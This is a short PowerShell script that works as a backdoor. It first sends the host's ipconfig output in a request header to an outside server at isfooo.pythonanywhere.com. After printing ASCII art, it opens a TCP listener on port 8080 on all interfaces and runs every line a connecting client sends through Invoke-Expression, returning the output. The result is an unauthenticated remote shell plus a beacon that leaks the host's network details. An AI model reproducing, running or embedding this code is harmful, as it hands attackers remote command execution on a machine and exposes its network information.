# Define the URL and headers
$url = "http://isfooo.pythonanywhere.com/"
$headers = @{
    'ip' = (ipconfig | Out-String)
}

# Create a WebClient object
$client = New-Object System.Net.WebClient

# Set the headers
foreach ($header in $headers.GetEnumerator()) {
    $client.Headers.Add($header.Key, $header.Value)
}

# Send the request
$response = $client.DownloadString($url)

# Display the response
Write-Host "Response from server:"
Write-Host $response

$asciiArt = @"
          _____                    _____                    _____                   _______                 
         /\    \                  /\    \                  /\    \                 /::\    \                
        /::\    \                /::\    \                /::\    \               /::::\    \               
        \:::\    \              /::::\    \              /::::\    \             /::::::\    \              
         \:::\    \            /::::::\    \            /::::::\    \           /::::::::\    \             
          \:::\    \          /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \            
           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \       /:::/    \:::\    \           
           /::::\    \       \:::\   \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \          
  ____    /::::::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\         
 /\   \  /:::/\:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |        
/::\   \/:::/  \:::\____\/::\   \:::\   \:::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |        
\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\   \::/    / \:::\    \   /:::/    /         
 \:::\/:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\   \/____/   \:::\    \ /:::/    /          
  \::::::/    /            \:::\   \:::\    \               \:::\    \        \:::\    /:::/    /           
   \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
    \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
     \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
      \:::\    \               \::::::/    /                                      \::/____/                
       \:::\____\               \::::/    /                                        \::/                      
        \::/    /                \::/    /                                          \/                       
         \/____/                  \/____/                                                                   
"@

# Display ASCII art on both client and host
Write-Host $asciiArt

# Set up TCP listener
$listener = New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Any, 8080)
$listener.Start()

Write-Host "Listening for connections on port 8080..."

while ($true) {
    if ($listener.Pending()) {
        $client = $listener.AcceptTcpClient()
        Write-Host "Client connected: $($client.Client.RemoteEndPoint)"
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.Write("PS > $asciiArt")
        $writer.Flush()

        while ($client.Connected) {
            $data = $reader.ReadLine()
            if ($data -eq $null) {
                break
            }

            $output = Invoke-Expression -Command $data | Out-String
            $writer.WriteLine($output)
            $writer.Flush()
        }

        Write-Host "Client disconnected: $($client.Client.RemoteEndPoint)"
        $client.Close()
    }

    Start-Sleep -Seconds 1
}

$listener.Stop()
